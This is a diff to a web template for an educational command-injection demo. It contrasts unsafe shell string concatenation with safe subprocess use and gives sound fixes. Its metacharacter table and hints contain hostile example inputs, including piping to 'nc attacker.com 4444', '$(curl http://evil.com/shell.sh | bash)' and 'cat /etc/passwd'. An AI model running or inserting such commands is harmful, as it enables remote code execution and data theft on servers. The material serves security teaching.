@@ -6,9 +6,38 @@
 <section class="card">
     <h2>Command Injection: File Lookup Example</h2>
     <p class="hint">
-        This demo pretends a web application running as <strong>www-data</strong>
-        on an Ubuntu Apache server tries to list a file under
-        <code>/var/www/html/uploads</code>.
+        Command injection occurs when an application passes user-controlled input to a system shell
+        without proper isolation. The shell interprets certain characters as control operators —
+        separating one command from the next — so an attacker can append arbitrary commands to whatever
+        the application intended to run.
+    </p>
+    <p class="hint">
+        This demo simulates a web application that lists a file under <code>/var/www/html/uploads</code>
+        by passing the filename to <code>ls</code>. The process runs as <strong>www-data</strong>
+        on an Ubuntu Apache server.
+    </p>
+</section>
+
+<section class="card">
+    <h2>How Shell Metacharacters Work</h2>
+    <div class="table-wrap">
+        <table>
+            <thead>
+                <tr><th>Metacharacter</th><th>Shell Meaning</th><th>Injection Example</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><code>;</code></td><td>Run next command regardless of exit code</td><td><code>file.pdf; whoami</code></td></tr>
+                <tr><td><code>&amp;&amp;</code></td><td>Run next command only if first succeeds</td><td><code>file.pdf &amp;&amp; id</code></td></tr>
+                <tr><td><code>||</code></td><td>Run next command only if first fails</td><td><code>nonexistent || cat /etc/passwd</code></td></tr>
+                <tr><td><code>|</code></td><td>Pipe output of first to second command</td><td><code>file.pdf | nc attacker.com 4444</code></td></tr>
+                <tr><td><code>$(…)</code></td><td>Command substitution — inline execution</td><td><code>$(curl http://evil.com/shell.sh | bash)</code></td></tr>
+                <tr><td><code>`…`</code></td><td>Backtick substitution (legacy form)</td><td><code>`id`</code></td></tr>
+            </tbody>
+        </table>
+    </div>
+    <p class="hint" style="margin-top: 8px;">
+        When the application runs <code>ls -l /var/www/html/uploads/<strong>USER_INPUT</strong></code>,
+        inserting any of these characters splits the string into multiple commands the shell executes in sequence.
     </p>
 </section>
 
@@ -29,7 +58,7 @@
                         ❌ Unsafe: Shell String Concatenation
                     </option>
                     <option value="safe" {% if mode == "safe" %}selected{% endif %}>
-                        ✅ Safe: Validation / No Shell Control
+                        ✅ Safe: Input Validation / No Shell
                     </option>
                 </select>
             </label>
@@ -49,11 +78,11 @@
 
         <h2 style="margin-top: 22px;">Examples to Try</h2>
         <div class="examples">
-            <div class="example">invoice.pdf</div>
-            <div class="example">image.png</div>
-            <div class="example">invoice.pdf; whoami</div>
-            <div class="example">invoice.pdf && id</div>
-            <div class="example">invoice.pdf; pwd</div>
+            <div class="example">invoice.pdf &nbsp;<span class="hint">— normal input</span></div>
+            <div class="example">invoice.pdf; whoami &nbsp;<span class="hint">— run second command</span></div>
+            <div class="example">invoice.pdf &amp;&amp; id &nbsp;<span class="hint">— user/group info</span></div>
+            <div class="example">invoice.pdf; pwd &nbsp;<span class="hint">— leak working directory</span></div>
+            <div class="example">invoice.pdf; find / -name "*.conf" &nbsp;<span class="hint">— file enumeration</span></div>
         </div>
     </section>
 </div>
@@ -65,19 +94,28 @@
     {% if mode == "unsafe" %}
         <p>
             <span class="pill pill-red">Unsafe Mode</span>
-            User input is inserted into a shell command.
+            The filename is concatenated directly into the shell command string.
         </p>
         <div class="mode-box unsafe">
             <div class="query">{{ command }}</div>
         </div>
+        <p class="hint">
+            Highlighted tokens show shell control characters that were injected by the filename input.
+            The shell executes everything on this line — including the attacker's extra commands.
+        </p>
     {% else %}
         <p>
             <span class="pill pill-green">Safe Mode</span>
-            Dangerous shell-control characters are rejected or avoided.
+            Shell-control characters are detected and rejected before the command is built.
         </p>
         <div class="mode-box safe">
             <div class="query">{{ command }}</div>
         </div>
+        <p class="hint">
+            In a real secure implementation, you would also prefer to avoid the shell entirely:
+            use <code>subprocess.run(["ls", "-l", safe_filename], shell=False)</code> so
+            the OS receives the filename as a distinct argument, never as shell syntax.
+        </p>
     {% endif %}
 </section>
 {% endif %}
@@ -94,34 +132,60 @@
 
     {% if mode == "unsafe" %}
         <p class="hint">
-            In unsafe mode, characters like <code>;</code>, <code>&&</code>,
-            or <code>|</code> can split one command into multiple commands.
+            Notice how the extra commands ran under the <strong>www-data</strong> identity.
+            An attacker who can run <code>id</code> today can run <code>curl http://evil.com/shell.sh | bash</code> tomorrow.
         </p>
     {% else %}
         <p class="hint">
-            In safe mode, input is treated as a filename, not as part of the shell syntax.
+            The filename was validated and treated as a data value. The shell never saw the control characters.
         </p>
     {% endif %}
 </section>
 {% endif %}
 
 <section class="card">
+    <h2>Real-World Impact</h2>
+    <div class="grid-2">
+        <div class="mode-box unsafe">
+            <p><strong>What an attacker can achieve</strong></p>
+            <ul class="hint" style="margin: 0; padding-left: 1.2em;">
+                <li>Run arbitrary commands as the web server user</li>
+                <li>Read <code>/etc/passwd</code>, config files, and application secrets</li>
+                <li>Establish a reverse shell for persistent access</li>
+                <li>Pivot to internal network services not exposed to the internet</li>
+                <li>Deploy malware or ransomware on the server</li>
+            </ul>
+        </div>
+        <div class="mode-box safe">
+            <p><strong>Correct fix</strong></p>
+            <ul class="hint" style="margin: 0; padding-left: 1.2em;">
+                <li>Prefer language-native APIs over shell invocation (e.g., Python <code>os.listdir()</code>)</li>
+                <li>If a shell must be used, pass arguments as an array with <code>shell=False</code></li>
+                <li>Allowlist expected input shapes (e.g., alphanumeric + dot + hyphen only)</li>
+                <li>Run the web process under a least-privilege user account</li>
+            </ul>
+        </div>
+    </div>
+</section>
+
+<section class="card">
     <h2>Teaching Point</h2>
     <p class="hint">
-        Command injection is the same core problem as SQL injection:
-        untrusted input crosses the boundary from <strong>data</strong> into
-        <strong>instructions</strong>.
+        Command injection follows the same root cause as SQL injection:
+        untrusted input crosses the boundary from <strong>data</strong> into <strong>instructions</strong>.
+        The interpreter here is the OS shell rather than a SQL engine, but the fix is the same —
+        keep data and commands structurally separate.
     </p>
 
     <div class="grid-2">
         <div class="mode-box unsafe">
             <p><span class="pill pill-red">Unsafe</span></p>
-            <div class="query">ls -l /var/www/html/uploads/USER_INPUT</div>
+            <div class="query">os.system("ls -l /uploads/" + filename)</div>
         </div>
 
         <div class="mode-box safe">
-            <p><span class="pill pill-green">Safer</span></p>
-            <div class="query">validate filename → use fixed command structure</div>
+            <p><span class="pill pill-green">Safe</span></p>
+            <div class="query">subprocess.run(["ls", "-l", filename], shell=False)</div>
         </div>
     </div>
 </section>
